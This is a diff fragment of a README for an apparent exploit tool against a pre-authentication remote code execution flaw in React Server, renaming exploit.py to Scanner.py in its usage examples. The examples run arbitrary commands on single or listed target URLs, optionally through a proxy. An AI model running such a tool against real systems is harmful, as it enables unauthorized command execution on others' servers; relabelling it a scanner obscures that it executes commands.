@@ -40,25 +40,25 @@ A pre-authentication remote code execution vulnerability exists in React Server 
 ### **Single Target Mode**
 
 ```
-python exploit.py -u https://target.com -c "whoami"
+python Scanner.py -u https://target.com -c "whoami"
 ```
 
 ### **Multiple Targets (from file)**
 
 ```
-python exploit.py -l urls.txt -c "whoami"
+python Scanner.py -l urls.txt -c "whoami"
 ```
 
 ### **With HTTP Proxy (Burp Suite)**
 
 ```
-python exploit.py -u https://target.com -c "whoami" --proxy 127.0.0.1:8080
+python Scanner.py -u https://target.com -c "whoami" --proxy 127.0.0.1:8080
 ```
 
 ### **With HTTPS Proxy**
 
 ```
-python exploit.py -u https://target.com -c "whoami" --proxy-https 127.0.0.1:8080
+python Scanner.py -u https://target.com -c "whoami" --proxy-https 127.0.0.1:8080
 ```
 
 ---
@@ -76,7 +76,7 @@ http://192.168.1.10:3000
 ## 🖥️ Sample Output
 
 ```
-PS D:\Ankitspandey07\React2Hell> python.exe .\exploit.py -l .\list.txt -c whoami
+PS D:\Ankitspandey07\React2Hell> python.exe .\Scanner.py -l .\list.txt -c whoami
 
 
 █████▄  ▄▄▄▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄▄ ████▄ ▄▄▄▄▄  ██  ██ ▄▄▄▄▄ ▄▄    ▄▄    
